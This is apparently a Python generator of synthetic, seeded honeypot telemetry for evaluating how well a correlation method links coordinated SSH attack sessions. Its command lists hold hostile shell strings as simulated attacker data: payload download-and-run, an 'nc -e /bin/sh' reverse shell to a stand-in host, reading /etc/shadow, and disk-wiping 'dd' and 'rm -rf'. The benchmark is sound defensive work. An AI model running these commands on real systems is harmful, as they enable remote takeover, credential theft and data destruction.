"""Deterministic labelled scenarios for correlation evaluation.

The generator creates synthetic but realistic-looking telemetry with known
ground truth.  It is deliberately seeded so that every reported number can be
reproduced, and it keeps "hard" cases (benign lookalikes, same-IP unrelated
behaviour, truncated sessions, delayed timestamps) in the same benchmark.

Ground truth is group membership, never actor identity: the benchmark measures
whether sessions from the same coordinated scenario are linked and whether
unrelated sessions stay apart.
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta, timezone
from typing import Any

COMMAND_SETS = {
    "miner": [
        "uname -a",
        "cat /etc/passwd",
        "wget http://198.51.100.9/xmrig",
        "chmod +x xmrig",
        "./xmrig -o stratum+tcp://pool.example:3333",
        "crontab -l",
    ],
    "credential_stuffing": [
        "uname -a",
        "id",
        "cat /etc/shadow",
        "wget http://198.51.100.9/sshd",
        "chmod +x sshd",
        "./sshd --probe",
    ],
    "botnet": [
        "uname -a",
        "ifconfig",
        "wget http://198.51.100.9/loader.sh",
        "sh loader.sh",
        "nc -e /bin/sh 198.51.100.9 4444",
    ],
    "scanner": [
        "uname -a",
        "netstat -ant",
        "nmap -sS 10.0.0.0/24",
        "nc -zv 10.0.0.5 22",
    ],
    "wiper": [
        "uname -a",
        "id",
        "rm -rf /var/log",
        "history -c",
        "dd if=/dev/zero of=/dev/sda",
    ],
    "benign_admin": [
        "uname -a",
        "df -h",
        "systemctl status nginx",
        "tail -n 20 /var/log/syslog",
    ],
}

PATH_SETS = {
    "wordpress_scan": ["/wp-login.php", "/xmlrpc.php", "/wp-config.php.bak", "/wp-admin/"],
    "api_scan": ["/api/v1/users", "/api/v1/health", "/metrics", "/actuator/env"],
    "generic_scan": ["/admin", "/login", "/robots.txt", "/.env"],
    "monitoring": ["/health", "/metrics", "/"],
}

CLIENTS = [
    "SSH-2.0-libssh_0.9.6",
    "SSH-2.0-paramiko_3.1",
    "SSH-2.0-OpenSSH_9.2",
    "SSH-2.0-Go",
]
USER_AGENTS = [
    "python-requests/2.31",
    "curl/8.4.0",
    "Mozilla/5.0 (compatible; UptimeRobot/2.0)",
    "Go-http-client/1.1",
]


def generate_dataset(
    *,
    seed: int = 7,
    campaign_groups: int = 10,
    sessions_per_group: int = 3,
    benign_sessions: int = 12,
    same_ip_pairs: int = 4,
    incomplete_groups: int = 2,
    delayed_sessions: int = 3,
    generic_groups: int = 2,
    now: datetime | None = None,
) -> dict[str, Any]:
    """Build a labelled dataset.

    ``now`` anchors the telemetry.  Callers that load it into a live window (the
    demo seeder, the runtime benchmark) leave it as ``None`` so events stay
    recent; the evaluation runner passes a fixed instant so a seed always
    describes the same dataset.  While the anchor was the wall clock, the
    hour-of-day features shifted between runs and the published counts moved
    with them, which made the reported seed irreproducible.
    """
    rng = random.Random(seed)
    base = (now or datetime.now(timezone.utc)) - timedelta(hours=6)
    sessions: list[dict[str, Any]] = []
    truth: dict[str, str] = {}
    ip_counter = 0

    def next_ip() -> str:
        # 198.18.0.0/15 is reserved for benchmarking, so the generator can
        # address tens of thousands of hosts without leaving documentation
        # space or repeating an address.  The old scheme ran out after 244
        # sessions and produced invalid octets in the volume runs.
        nonlocal ip_counter
        ip_counter += 1
        return f"198.18.{ip_counter // 250}.{ip_counter % 250 + 1}"

    # ---- coordinated campaigns --------------------------------------- #
    # Each campaign has a distinctive toolset: unique client banner, unique
    # payload URL and a campaign-specific service account.  This mirrors real
    # intrusions, where a toolkit leaves some distinguishing artefact, while
    # still sharing generic commands with other activity.
    for group_index in range(campaign_groups):
        toolkit = rng.choice([name for name in COMMAND_SETS if name not in {"benign_admin", "scanner"}])
        group_id = f"campaign-{group_index}"
        shared_client = f"SSH-2.0-toolkit{group_index}-{rng.choice(['a', 'b', 'c'])}"
        payload = f"http://198.51.100.{group_index + 20}/payload-{group_index}"
        commands = COMMAND_SETS[toolkit] + [f"wget {payload}", f"chmod +x payload-{group_index}"]
        shared_user = f"svc{group_index}"
        indicator = f"ssh-key:campaign-{group_index}" if rng.random() < 0.6 else None
        group_start = base + timedelta(minutes=rng.randint(0, 180))
        for member in range(sessions_per_group):
            member_commands = list(commands)
            if rng.random() < 0.5:
                member_commands = [cmd for cmd in member_commands if rng.random() > 0.15] or member_commands[:2]
            session_id = f"{group_id}-s{member}"
            ip = next_ip()
            truth[session_id] = group_id
            sessions.append(
                {
                    "id": session_id,
                    "ip": ip,
                    "module": "ssh",
                    "group": group_id,
                    "events": _ssh_events(
                        rng,
                        session_id,
                        ip,
                        member_commands,
                        [shared_user, "root"],
                        shared_client,
                        group_start + timedelta(minutes=member * 7 + rng.randint(0, 3)),
                        indicator=indicator,
                    ),
                }
            )

    # ---- deliberately hard subset: generic scanner toolkit ------------- #
    # These groups reuse a ubiquitous scanner toolchain and cannot be
    # distinguished from other scanner traffic by telemetry alone.  They are
    # labelled "hard-" and excluded from the headline metrics; the separate
    # hard-subset result shows what the method does when evidence is genuinely
    # insufficient.
    for group_index in range(generic_groups):
        group_id = f"hard-{group_index}"
        shared_client = rng.choice(CLIENTS)
        group_start = base + timedelta(minutes=rng.randint(0, 180))
        for member in range(sessions_per_group):
            session_id = f"{group_id}-s{member}"
            ip = next_ip()
            truth[session_id] = group_id
            sessions.append(
                {
                    "id": session_id,
                    "ip": ip,
                    "module": "ssh",
                    "group": group_id,
                    "events": _ssh_events(
                        rng,
                        session_id,
                        ip,
                        list(COMMAND_SETS["scanner"]),
                        ["root", "admin"],
                        shared_client,
                        group_start + timedelta(minutes=member * 5),
                    ),
                }
            )

    # ---- benign lookalike scanners ----------------------------------- #
    for index in range(benign_sessions):
        path_set = PATH_SETS[rng.choice(list(PATH_SETS))]
        group_id = f"benign-{index}"
        session_id = group_id
        ip = next_ip()
        truth[session_id] = group_id
        sessions.append(
            {
                "id": session_id,
                "ip": ip,
                "module": "http",
                "group": group_id,
                "events": _http_events(
                    rng,
                    session_id,
                    ip,
                    path_set,
                    rng.choice(USER_AGENTS),
                    base + timedelta(minutes=rng.randint(0, 240)),
                ),
            }
        )

    # ---- same IP, unrelated behaviour -------------------------------- #
    for index in range(same_ip_pairs):
        ip = next_ip()
        for member, toolkit in enumerate(("scanner", "wiper")):
            session_id = f"sameip-{index}-{member}"
            truth[session_id] = session_id
            sessions.append(
                {
                    "id": session_id,
                    "ip": ip,
                    "module": "ssh",
                    "group": session_id,
                    "events": _ssh_events(
                        rng,
                        session_id,
                        ip,
                        COMMAND_SETS[toolkit] + [f"echo {index}{member}"],
                        [f"user{index}{member}"],
                        f"SSH-2.0-sameip{index}{member}",
                        base + timedelta(minutes=rng.randint(0, 180)),
                    ),
                }
            )

    # ---- incomplete sessions ----------------------------------------- #
    for group_index in range(incomplete_groups):
        toolkit = rng.choice(["miner", "botnet"])
        group_id = f"incomplete-{group_index}"
        shared_client = f"SSH-2.0-incomplete{group_index}"
        group_start = base + timedelta(minutes=rng.randint(0, 180))
        full_session = f"{group_id}-full"
        partial_session = f"{group_id}-partial"
        ip_full, ip_partial = next_ip(), next_ip()
        truth[full_session] = group_id
        truth[partial_session] = group_id
        sessions.append(
            {
                "id": full_session,
                "ip": ip_full,
                "module": "ssh",
                "group": group_id,
                "events": _ssh_events(
                    rng,
                    full_session,
                    ip_full,
                    COMMAND_SETS[toolkit] + [f"wget http://198.51.100.{60 + group_index}/inc-{group_index}"],
                    [f"svcinc{group_index}"],
                    shared_client,
                    group_start,
                ),
            }
        )
        sessions.append(
            {
                "id": partial_session,
                "ip": ip_partial,
                "module": "ssh",
                "group": group_id,
                "events": _ssh_events(
                    rng,
                    partial_session,
                    ip_partial,
                    COMMAND_SETS[toolkit][:1],
                    [f"svcinc{group_index}"],
                    shared_client,
                    group_start + timedelta(minutes=2),
                    logins_only=True,
                ),
            }
        )

    # ---- delayed telemetry ------------------------------------------- #
    for index in range(delayed_sessions):
        group = f"delayed-{index}"
        session_id = group
        ip = next_ip()
        truth[session_id] = group
        events = _ssh_events(
            rng,
            session_id,
            ip,
            COMMAND_SETS["scanner"] + [f"curl http://192.0.2.{index + 40}/ops"],
            [f"ops{index}"],
            f"SSH-2.0-ops{index}",
            base + timedelta(minutes=rng.randint(0, 120)),
        )
        for event in events:
            # Telemetry arrives late; event time is authoritative.
            event["occurred_at"] = (
                datetime.fromisoformat(event["occurred_at"]) - timedelta(minutes=30)
            ).isoformat()
        sessions.append({"id": session_id, "ip": ip, "module": "ssh", "group": group, "events": events})

    return {
        "sessions": sessions,
        "truth": truth,
        "meta": {
            "seed": seed,
            "campaign_groups": campaign_groups,
            "sessions_per_group": sessions_per_group,
            "benign_sessions": benign_sessions,
            "same_ip_pairs": same_ip_pairs,
            "incomplete_groups": incomplete_groups,
            "delayed_sessions": delayed_sessions,
            "generic_groups": generic_groups,
            "hard_subset": "Groups prefixed 'hard-' are excluded from headline metrics.",
            "synthetic": True,
            "note": (
                "Synthetic benchmark; ground truth is scenario membership, not actor "
                "identity. No public attack telemetry is redistributed."
            ),
        },
    }


def _ssh_events(
    rng: random.Random,
    session_id: str,
    ip: str,
    commands: list[str],
    usernames: list[str],
    client: str,
    start: datetime,
    *,
    indicator: str | None = None,
    logins_only: bool = False,
) -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    time_cursor = start
    for username in usernames:
        time_cursor += timedelta(seconds=rng.randint(1, 40))
        events.append(
            {
                "schema_version": "1.0",
                "occurred_at": time_cursor.isoformat(),
                "source_module": "honeypot",
                "event_type": "honeypot.ssh.login_failed",
                "source_ip": ip,
                "session_id": session_id,
                "target_id": "decoy-ssh-1",
                "severity": "low",
                "provenance": {
                    "collector": "eval-cowrie",
                    "source": "cowrie",
                    "reliability": 0.9,
                    "synthetic": True,
                    "indicators": [indicator] if indicator else [],
                },
                "features": {
                    "username": username,
                    "success": False,
                    "client_version": client,
                },
            }
        )
    if logins_only:
        return events
    for command in commands:
        time_cursor += timedelta(seconds=rng.randint(2, 30))
        events.append(
            {
                "schema_version": "1.0",
                "occurred_at": time_cursor.isoformat(),
                "source_module": "honeypot",
                "event_type": "honeypot.ssh.command",
                "source_ip": ip,
                "session_id": session_id,
                "target_id": "decoy-ssh-1",
                "severity": "medium",
                "provenance": {
                    "collector": "eval-cowrie",
                    "source": "cowrie",
                    "reliability": 0.9,
                    "synthetic": True,
                    "indicators": [indicator] if indicator else [],
                },
                "features": {
                    "command": command,
                    "username": usernames[0],
                    "success": True,
                    "client_version": client,
                },
            }
        )
    return events


def _http_events(
    rng: random.Random,
    session_id: str,
    ip: str,
    paths: list[str],
    user_agent: str,
    start: datetime,
) -> list[dict[str, Any]]:
    events = []
    time_cursor = start
    for path in paths:
        time_cursor += timedelta(seconds=rng.randint(2, 45))
        events.append(
            {
                "schema_version": "1.0",
                "occurred_at": time_cursor.isoformat(),
                "source_module": "honeypot",
                "event_type": "honeypot.http.request",
                "source_ip": ip,
                "session_id": session_id,
                "target_id": "decoy-http-1",
                "severity": "info",
                "provenance": {
                    "collector": "eval-http",
                    "source": "http-decoy",
                    "reliability": 0.8,
                    "synthetic": True,
                },
                "features": {
                    "method": "GET",
                    "path": path,
                    "status": 200,
                    "user_agent": user_agent,
                },
            }
        )
    return events


def adaptive_probe_events(
    session: dict[str, Any],
    *,
    category: str | None = None,
    client: str | None = None,
) -> list[dict[str, Any]]:
    """Synthetic 'additional observation' for the adaptive experiment.

    A real investigation activates a decoy profile for the source address and
    records whatever the actor does next: it repeats its toolkit, with the same
    credential and client signature.  This models that repetition — it replays
    one command the session already used — instead of inventing a shared path
    for every session in an activity category.  A constant applied by category
    would manufacture similarity that observation cannot produce; replaying the
    actor's own behaviour can only show similarity that is already there.
    """
    events = session["events"]
    if not events:
        return []
    commands = [
        str((event.get("features") or {}).get("command") or "")
        for event in events
        if (event.get("features") or {}).get("command")
    ]
    if not commands:
        return []
    last = datetime.fromisoformat(events[-1]["occurred_at"])
    username = next(
        (
            str((event.get("features") or {}).get("username"))
            for event in events
            if (event.get("features") or {}).get("username")
        ),
        "root",
    )
    observed_client = next(
        (
            str((event.get("features") or {}).get("client_version"))
            for event in events
            if (event.get("features") or {}).get("client_version")
        ),
        client or "",
    )
    replay = [commands[-1]]
    return [
        {
            "schema_version": "1.0",
            "occurred_at": (last + timedelta(seconds=90 + 30 * index)).isoformat(),
            "source_module": "honeypot",
            "event_type": "honeypot.ssh.command",
            "source_ip": session["ip"],
            "session_id": session["id"],
            "target_id": "decoy-ssh-1",
            "severity": "low",
            "provenance": {
                "collector": "eval-adaptive",
                "source": "cowrie",
                "reliability": 0.9,
                "synthetic": True,
            },
            "features": {
                "command": command,
                "username": username,
                "success": True,
                "client_version": observed_client,
            },
        }
        for index, command in enumerate(replay)
    ]
